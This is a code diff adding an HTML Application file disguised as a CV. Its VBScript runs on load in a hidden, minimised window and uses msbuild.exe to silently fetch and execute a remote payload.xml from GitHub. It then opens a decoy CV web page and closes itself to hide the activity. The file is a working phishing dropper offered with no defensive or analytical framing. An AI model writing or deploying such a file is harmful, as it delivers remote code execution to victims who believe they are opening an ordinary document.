@@ -1,0 +1,26 @@
+<!-- CV.hta -->
+<html>
+<head>
+<HTA:APPLICATION ID="CVViewer" APPLICATIONNAME="CV Document" 
+                 BORDER="none" CAPTION="no" SHOWINTASKBAR="no"
+                 WINDOWSTATE="minimize"ICON="C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe#1"/>
+<script language="VBScript">
+    Sub AutoExec
+        On Error Resume Next
+        
+        ' Execute payload silently
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run "msbuild.exe http://raw.githubusercontent.com/yourusername/repo/main/payload.xml", 0, False
+        
+        ' Open actual CV
+        shell.Run "http://your-cv-website.com/cv.html", 1, False
+        
+        ' Instant close
+        window.close()
+    End Sub
+</script>
+</head>
+<body onload="AutoExec">
+<!-- Empty body for instant close -->
+</body>
+</html>
